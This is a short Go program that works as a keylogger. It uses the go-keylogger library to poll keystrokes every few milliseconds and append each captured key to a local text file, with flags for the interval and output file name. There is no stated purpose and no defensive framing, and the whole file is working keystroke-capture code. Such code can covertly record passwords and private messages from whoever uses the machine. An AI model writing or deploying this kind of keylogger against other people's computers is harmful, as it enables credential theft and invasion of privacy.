package main

import (
	"flag"
	"fmt"
	"os"
	"time"

	"github.com/kindlyfire/go-keylogger"
)

func main() {
	delayFetch := flag.Int("int", 5, "frequency of fetch in ms (default = 5)")
	outputFile := flag.String("string", "output.txt", "defines output file (default = output.txt)")
	flag.Parse()

	f, err := os.Create(*outputFile)

	if err != nil {
		fmt.Println("Critical error creating file: ", err)
	}

	defer f.Close()

	kl := keylogger.NewKeylogger()

	for {
		key := kl.GetKey()

		if !key.Empty {
			_, err2 := f.WriteString(string(key.Rune))
			_, err3 := f.WriteString("\n")

			if (err2 != nil) || (err3 != nil) {
				fmt.Println("Fatal error writing to file: ", err2, err3)
			}
		}

		time.Sleep(time.Duration(*delayFetch) * time.Millisecond)
	}
}
